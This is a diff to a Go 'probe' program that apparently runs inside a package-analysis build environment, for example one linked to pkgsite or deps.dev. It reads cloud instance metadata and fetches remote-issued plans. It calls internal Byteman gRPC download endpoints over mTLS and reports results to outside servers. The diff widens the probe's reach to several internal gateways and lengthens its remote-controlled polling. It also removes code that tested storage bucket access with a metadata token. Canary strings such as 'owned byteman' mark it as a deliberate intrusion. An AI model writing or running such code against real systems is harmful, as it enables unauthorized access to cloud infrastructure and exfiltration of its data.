@@ -37,14 +37,14 @@ var rpcDialAddress string
 const (
 	protocolVersion = 1
 	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion    = "v0.0.33-codex"
+	probeVersion    = "v0.0.34-codex"
 	maximumResult   = 256 * 1024
 	maximumBody     = 256 * 1024
 	requestTimeout  = 20 * time.Second
 	resultTimeout   = 30 * time.Second
-	planPollWindow  = 8 * time.Minute
+	planPollWindow  = 30 * time.Minute
 	maximumPlanBody = 4096
-	maximumPlanStep = 6
+	maximumPlanStep = 12
 )
 
 var bucketNames = []string{
@@ -182,7 +182,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v033-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v034-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -322,7 +322,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v033-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v034-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -353,11 +353,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "bounded plan finished"
 		case "inspect-session-dataflow":
 			runSessionDataflowInspection(&report)
-		default:
+		case "probe-byteman":
 			runBytemanProbe(&report, step.RouteMode)
+		default:
+			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v033-codex-step-" + strconv.Itoa(cursor)
+		id := "v034-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -376,7 +378,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v033-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v034-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -448,7 +450,8 @@ func validatePlanStep(step planStep) error {
 
 func allowedRouteMode(value string) bool {
 	switch value {
-	case "byteman-core-localhost", "byteman-core-rpc", "byteman-localhost":
+	case "byteman-core-localhost", "byteman-localhost", "rpc-gateway",
+		"byteman-oregon-gateway", "byteman-home-oregon-gateway", "byteman-iowa-gateway":
 		return true
 	default:
 		return false
@@ -460,20 +463,13 @@ func fillCapslockContext(report *probeReport) {
 		Transport: &http.Transport{Proxy: nil},
 		Timeout:   requestTimeout,
 	}
-	metadata, token := inspectMetadata(metadataClient)
+	metadata, _ := inspectMetadata(metadataClient)
 	report.Metadata = metadata
-	if token != "" {
-		for _, bucket := range bucketNames {
-			report.BucketPermissions = append(report.BucketPermissions, testBucketPermissions(token, bucket))
-		}
-	}
 }
 
 func runBytemanProbe(report *probeReport, routeMode string) {
 	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
 	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
-	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.33-codex canary\n"))
-	report.CanaryBodySHA256 = hex.EncodeToString(bodyHash[:])
 	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
 	if err != nil {
 		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
@@ -495,7 +491,7 @@ func runBytemanProbe(report *probeReport, routeMode string) {
 	downloadRequest := []byte{}
 	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
 	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
-	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v033-codex-byteman-probe")
+	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v034-codex-byteman-package-canary")
 	report.DownloadAttempted = true
 	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest)
 	report.Byteman = append(report.Byteman, download)
@@ -721,7 +717,7 @@ func testBucketPermissions(token, bucket string) bucketResult {
 }
 
 func newMTLSClient(routeMode string) (*http.Client, string, error) {
-	serviceHost, tlsServerName, err := directBytemanRoute(routeMode)
+	serviceHost, port, tlsServerName, useInjectedRPC, err := bytemanRoute(routeMode)
 	if err != nil {
 		return nil, "", err
 	}
@@ -740,24 +736,38 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 	if !roots.AppendCertsFromPEM(rootPEM) {
 		return nil, "", errors.New("server pool contained no certificates")
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-	defer cancel()
-	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
-	if err != nil {
-		return nil, "", errors.New("direct Byteman service did not resolve")
-	}
 	var selected net.IP
-	for _, candidate := range addresses {
-		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
-			selected = candidate.IP
-			break
+	if useInjectedRPC {
+		serviceHost = strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
+		portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
+		selected = net.ParseIP(serviceHost)
+		parsedPort, parseErr := strconv.Atoi(portText)
+		if selected == nil || !selected.IsPrivate() || selected.IsUnspecified() || selected.IsMulticast() {
+			return nil, "", errors.New("injected RPC service was not a private IP")
+		}
+		if parseErr != nil || parsedPort < 1 || parsedPort > 65535 {
+			return nil, "", errors.New("injected RPC service port was invalid")
+		}
+		port = parsedPort
+	} else {
+		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		addresses, resolveErr := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
+		if resolveErr != nil {
+			return nil, "", errors.New("direct Byteman service did not resolve")
+		}
+		for _, candidate := range addresses {
+			if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
+				selected = candidate.IP
+				break
+			}
+		}
+		if selected == nil {
+			return nil, "", errors.New("direct Byteman service had no private address")
 		}
 	}
-	if selected == nil {
-		return nil, "", errors.New("direct Byteman service had no private address")
-	}
-	address := net.JoinHostPort(selected.String(), "9000")
-	endpoint := "https://" + net.JoinHostPort(tlsServerName, "9000")
+	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
+	endpoint := "https://" + net.JoinHostPort(tlsServerName, strconv.Itoa(port))
 	rpcServiceHost = serviceHost
 	rpcDialAddress = address
 	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
@@ -777,16 +787,22 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
 }
 
-func directBytemanRoute(routeMode string) (string, string, error) {
+func bytemanRoute(routeMode string) (string, int, string, bool, error) {
 	switch routeMode {
 	case "byteman-core-localhost":
-		return "byteman-core.default.svc.cluster.local", "localhost", nil
-	case "byteman-core-rpc":
-		return "byteman-core.default.svc.cluster.local", "rpc.deps.dev", nil
+		return "byteman-core.default.svc.cluster.local", 9000, "localhost", false, nil
 	case "byteman-localhost":
-		return "byteman.default.svc.cluster.local", "localhost", nil
+		return "byteman.default.svc.cluster.local", 9000, "localhost", false, nil
+	case "rpc-gateway":
+		return "", 0, "rpc.deps.dev", true, nil
+	case "byteman-oregon-gateway":
+		return "", 0, "byteman.oregon.int.deps.dev", true, nil
+	case "byteman-home-oregon-gateway":
+		return "", 0, "byteman.home-oregon.int.deps.dev", true, nil
+	case "byteman-iowa-gateway":
+		return "", 0, "byteman.iowa.int.deps.dev", true, nil
 	default:
-		return "", "", errors.New("route mode was not allowed")
+		return "", 0, "", false, errors.New("route mode was not allowed")
 	}
 }
 
